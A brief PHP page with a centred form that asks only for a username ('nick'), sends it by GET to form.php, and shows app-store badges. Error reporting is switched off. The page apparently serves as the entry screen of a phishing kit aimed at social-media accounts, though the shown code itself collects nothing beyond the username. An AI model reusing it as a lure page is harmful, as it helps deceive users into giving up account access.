<?php
include ("app/config.php");
include ("app/database/router.php");
include ("app/database/yazilar.php");
error_reporting(0);
?>
<html>
 <head>
    <?php include ("app/tag/main/meta.php"); ?>
    <link href="assets/theme/bestui/css/style.css" type="text/css" rel="stylesheet"/>






 </head>     
   <body>
     <body bgcolor="#fafafa">
       <br>
       <br>
       <br>
<center>

<div class="form">
<form method="get" action="form.php">

<img src="assets/theme/bestui/image/giris.gif" width=179>

<h2><?php echo $homebaslik; ?></h2>

<p>
 <?php echo $homeyazi; ?> 
</p>
<br>
 <input type="text" class="nick" name=nick placeholder="username" required="1"aria-required="true">
 <br>
 <br>
<button>Continue<tbutton>

</form>
</div>

<br>
<br>

</div>

</center>

<center><br> <br>

<div id="get">

<img src="assets/theme/bestui/image/app.webp" width=120 >

<img src="assets/theme/bestui/image/play.webp" width=120>

</div>

<br><br><br>


<?php include 'assets/theme/bestui/footer.php'; ?>